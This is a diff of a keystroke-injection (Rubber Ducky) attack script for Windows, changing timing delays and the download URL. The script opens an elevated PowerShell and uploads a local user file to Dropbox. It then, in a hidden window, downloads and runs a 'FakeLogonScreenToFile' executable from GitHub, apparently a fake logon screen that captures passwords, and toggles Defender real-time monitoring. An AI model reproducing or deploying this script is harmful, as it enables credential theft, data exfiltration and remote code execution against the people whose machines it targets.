@@ -12,7 +12,7 @@ WINDOWS r
 DELAY 300
 STRING powershell Start-Process powershell -Verb runAs
 ENTER
-DELAY 1750
+DELAY 2000
 ALT y
 DELAY 800
 
@@ -70,7 +70,7 @@ STRING $userDbPath = Join-Path -Path $localAppDataPath -ChildPath "Microsoft\use
 ENTER
 STRING $userDbPath | DropBox-Upload
 REM Save the script to script.ps1
-DELAY 500
+DELAY 1000
 CTRL s
 DELAY 500
 STRING %USERPROFILE%\script.ps1
@@ -83,5 +83,5 @@ STRING x
 DELAY 500
 
 REM Download and execute the .exe file
-STRING powershell -w h $url = 'https://github.com/Potential-Threat/Ducky-script-Fake-Windows-Logon/blob/main/FakeLogonScreenToFile.exe?raw=true'; $output = 'C:\Windows\Temp\your_file.exe'; Invoke-WebRequest -Uri $url -OutFile $output; Start-Process -FilePath $output -Wait; ./script.ps1 -Wait; Remove-Item './script.ps1' -Wait; Set-MpPreference -DisableRealtimeMonitoring $false; exit
+STRING powershell -w h$url = 'https://github.com/CodingRabbi/Ducky-script-Fake-Windows-Logon/blob/main/FakeLogonScreenToFile.exe?raw=true'; $output = 'C:\Windows\Temp\your_file.exe'; Invoke-WebRequest -Uri $url -OutFile $output; Start-Process -FilePath $output -Wait; ./script.ps1 -Wait; Remove-Item './script.ps1'; Set-MpPreference -DisableRealtimeMonitoring $false; exit
 ENTER
